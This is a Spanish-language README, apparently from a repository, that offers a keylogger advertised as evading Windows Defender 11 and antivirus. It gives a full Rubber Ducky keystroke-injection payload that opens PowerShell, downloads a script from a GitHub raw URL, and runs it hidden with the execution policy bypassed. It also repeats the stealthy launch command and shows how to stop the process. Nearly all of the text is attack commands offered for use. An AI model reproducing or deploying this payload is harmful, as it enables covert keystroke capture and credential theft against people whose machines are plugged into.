***Keylogger con evasión de Windows Defender 11 y Antivirus.***

# ---------------------------------------------------------
# By R.G.M - 2025
# ---------------------------------------------------------


Keylogger capaz de evadir Windows Defender 11 y Antivirus.
Creado con la idea de ejecutarlo remotamente desde un rubberducky.

# ---------------------------------------------------------
# PAYLOAD para RUBBER DUCKY;
# ---------------------------------------------------------

DELAY 20

GUI r

DELAY 20

STRING cmd

ENTER	

ENTER

DELAY 20

STRING powershell

ENTER

DELAY 20

STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/C4sp3r2222/duckylog/main/script.ps1" -OutFile "$env:USERPROFILE\Desktop\script.ps1"

ENTER

DELAY 300

STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"

ENTER


# ---------------------------------------------------------
# EJECUCION en Powershell en modo sigiloso y persistente:
# ---------------------------------------------------------

powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"

# ---------------------------------------------------------
# DETENCION DE SCRIPT:
# ---------------------------------------------------------

-Ejecutar en Powershell:
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine

-(Veremos un numero de proceso asociado Ej: 1234 )

-Para detenerlo, ejecutar en powershell:
Stop-Process -Id 1234 -Force

# (Detenemos el proceso)
